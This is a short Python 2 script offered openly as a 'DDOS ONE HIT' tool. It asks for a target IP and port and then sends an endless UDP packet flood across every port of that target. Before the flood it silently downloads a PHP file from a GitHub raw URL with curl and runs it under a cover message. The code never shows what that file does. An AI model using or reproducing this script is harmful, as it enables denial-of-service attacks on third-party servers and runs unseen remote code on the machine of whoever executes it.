import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

print "Downloading Source..."
os.system("curl --url https://raw.githubusercontent.com/bibilgates/r/master/bil.php -o bil.php")


os.system("clear")

print
print "DDOS ONE HITTT !!!\n"
print "You Tube : https://www.youtube.com/c/HA-MRX"
print "github   : https://github.com/Ha3MrX"
print "Facebook : https://www.facebook.com/muhamad.jabar222"
print
ip = raw_input("IP Target : ")
port = input("Port      : ")


print "[                    ] 0% "
time.sleep(1)
print "[=====               ] 25%"
time.sleep(1)
print "[==========          ] 50%"
time.sleep(1)
print "[===============     ] 75%"
time.sleep(1)
print "[====================] 100%"
time.sleep(1)
print "\n\n[+] DDOS ONE HIT !!!, Attack Starting...\n\n"
sent = 0

time.sleep(1)
print "[+] Mencari kelemahan Server, Please wait..."
os.system("php bil.php")

while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
